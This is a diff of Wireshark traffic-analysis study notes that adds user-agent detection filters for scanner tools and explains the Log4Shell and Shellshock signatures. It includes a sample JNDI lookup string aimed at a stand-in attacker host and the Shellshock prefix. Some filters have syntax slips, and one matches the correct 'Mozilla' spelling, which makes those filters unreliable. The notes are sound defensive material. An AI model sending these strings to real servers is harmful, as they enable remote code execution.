@@ -59,18 +59,37 @@ HTTP Analysis
 |Line-Based Text Data: Cleartext data provided by the server|`http.connection == Keep-Alive"`|
 |HTML Form URL Encoded: Web form information|`data-text-lines contains "keyword"`|
 
-**User Agent Analysis** 
+User Agent Analysis
+---
 
 - When analyzing network traffic in Wireshark, the user-agent field is a great resource for detecting anomalies.  
     
 
 |   |   |
 |---|---|
-|Notes|Wireshark Filter|
-|Global search.|- http.user_agent|
-|Research outcomes for grabbing the low-hanging fruits: <br><br>- Different user agent information from the same host in a short time notice. <br>    <br><br>- Non-standard and custom user agent info. <br>    <br><br>- Subtle spelling differences. ("Mozilla" is not the same as  "Mozlilla" or "Mozlila") <br>    <br><br>- Audit tools info like Nmap, Nikto, Wfuzz and sqlmap in the user agent field. <br>    <br><br>- Payload data in the user agent field.|- (http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")|
+|**Notes**|**Wireshark Filter**|
+|Global search| `http.user_agent`|
+|**Research outcomes for grabbing the low-hanging fruits**||
+|Different User_Agent Info From Same Host|`http.user-agent and ip.src =="target_ip"`|
+|Non-Standard and custom User_Agent Info|`http.user_agent and not (http.user_agent contain "Mozilla" or http.user_agent contains "Opera")`|
+|Subtle Spelling Differences|`http.user_agent matches (?i)Mozilla or http.user_agent matches (?i)Goggle or http.user_agent matches (?i)Windowz` |
+|Audit Tools (Nmap, Nikto, Wfuzz, sqlmap)|`http.user_agent matches "(?i)sqlmap" or http.user_agent matches "(?i)Nmap" or http.user_agent matches "(?i)Wfuzz" or http.user_agent matches "(?i)Nikto" or http.user_agent matches "(?i)dirbuster" or http.user_agent matches "(?i)gobuster"`|
+|Payload Data In User Agent Field|`http.user_agent contains "${" or http.user_agent contains "() {" or http.user_agent contains "/bin/bash"`|
 
-**Log4j Analysis** 
+- `"${"` <--- is a marker for the Log4shell vulnerability that affected the Java logging library, Log4j.
+	- Used ti trigger a JNDI "Java Naming and Directory Interface" Lookup
+    - Java Naming and Directory Interface: A way for a program to find and lookup data or objects from an external source (database or server) `${jndi:ldap://attacker.com/Exploit}`
+- RedFlags in JDNI lookups (attacker is attempting to perform REMOTE CODE EXECUTION "RCE" - tryig to take full control of the server by forcing it to "look up" and run their malicious codes)
+	- LDAP `ldap://`: Lightweight Directory Access Protocol (Most Common in attakcs)
+ 	- RMI `rmi://`: Remote Method Invocation
+  	- DNS `dns://`: Domain Name System
+  
+- `(){` or `() { :; };` Shellshock / CVE-2014-6271
+	- Is a signature for the shellshock vulnerability that affects the Bash shell in Linux
+ 	- In a old web server the User_Agent string is passed directly into a Bash enviornment. By starting with the `() { :; };`, an adversary can force the server to execute any commands they want immediately after he brackets.
+  
+Log4j Analysis 
+---
 
 |                                                                                                                                                                                                 |                                                                                                                                                                                                                                                                 |
 | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
